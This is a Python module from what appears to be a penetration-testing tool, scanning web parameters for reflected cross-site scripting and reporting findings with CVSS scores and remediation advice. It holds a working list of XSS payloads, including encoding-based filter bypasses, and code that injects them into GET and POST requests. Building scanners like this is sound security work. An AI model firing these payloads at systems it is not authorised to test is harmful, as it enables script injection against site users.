"""Cross-Site Scripting (XSS) testing — reflected, stored, DOM-based indicators."""

from __future__ import annotations

from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule

XSS_PAYLOADS = [
    ('<script>alert("pencheff")</script>', '<script>alert("pencheff")</script>'),
    ('"><script>alert("pencheff")</script>', '<script>alert("pencheff")</script>'),
    ("'><script>alert('pencheff')</script>", "<script>alert('pencheff')</script>"),
    ('<img src=x onerror=alert("pencheff")>', 'onerror=alert("pencheff")'),
    ('<svg onload=alert("pencheff")>', 'onload=alert("pencheff")'),
    ('" onmouseover="alert(1)" x="', 'onmouseover="alert(1)"'),
    ("javascript:alert('pencheff')", "javascript:alert"),
    ('<iframe src="javascript:alert(1)">', '<iframe src="javascript:alert'),
    ("{{constructor.constructor('return this')()}}", "constructor.constructor"),
    # Encoding bypasses
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", "<script>alert(1)</script>"),
    ("&#60;script&#62;alert(1)&#60;/script&#62;", "<script>alert(1)</script>"),
]

# Canary for reflection detection
CANARY = "pencheff7x8k"


class XSSModule(BaseTestModule):
    name = "xss"
    category = "xss"
    owasp_categories = ["A03"]
    description = "Cross-Site Scripting (XSS) testing"

    def get_techniques(self) -> list[str]:
        return ["reflected_xss", "stored_xss_indicator", "dom_xss_indicator"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings = []
        endpoints = self._get_target_endpoints(session, targets)

        for ep in endpoints[:25]:
            url = ep["url"]
            params = ep.get("params", [])
            method = ep.get("method", "GET")

            for param in params:
                # Step 1: Check if parameter value is reflected
                reflected = await self._check_reflection(http, url, param, method)
                if not reflected:
                    continue

                # Step 2: Try XSS payloads
                for payload, marker in XSS_PAYLOADS:
                    try:
                        resp = await self._inject(http, url, param, payload, method)
                        if marker.lower() in resp.text.lower():
                            # Check if it's inside an HTML context (not escaped)
                            context = self._detect_context(resp.text, marker)
                            findings.append(Finding(
                                title=f"Reflected XSS ({context} context)",
                                severity=Severity.HIGH,
                                category="xss",
                                owasp_category="A03",
                                description=f"Reflected XSS in parameter '{param}'. "
                                            f"Payload is rendered in {context} context without proper encoding.",
                                remediation="Encode output based on context (HTML entity encode for HTML, "
                                            "JS encode for JavaScript). Use Content-Security-Policy.",
                                endpoint=url,
                                parameter=param,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                                cvss_score=6.1,
                                cwe_id="CWE-79",
                                evidence=[Evidence(
                                    request_method=method,
                                    request_url=url,
                                    request_body=f"{param}={payload}",
                                    response_status=resp.status_code,
                                    response_body_snippet=resp.text[:300],
                                    description=f"Payload reflected in {context} context",
                                )],
                            ))
                            break
                    except Exception:
                        continue

        return findings

    async def _check_reflection(self, http, url, param, method) -> bool:
        try:
            resp = await self._inject(http, url, param, CANARY, method)
            return CANARY in resp.text
        except Exception:
            return False

    async def _inject(self, http, url, param, payload, method):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if method == "GET":
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return await http.get(test_url, module="xss")
        else:
            body_params = {p: qs.get(p, [""])[0] for p in qs}
            body_params[param] = payload
            return await http.post(
                url, body=urlencode(body_params),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                module="xss",
            )

    def _detect_context(self, html: str, marker: str) -> str:
        idx = html.lower().find(marker.lower())
        if idx < 0:
            return "unknown"
        before = html[max(0, idx - 50):idx].lower()
        if "<script" in before:
            return "JavaScript"
        if "value=" in before or "'" in before[-5:] or '"' in before[-5:]:
            return "HTML attribute"
        return "HTML body"
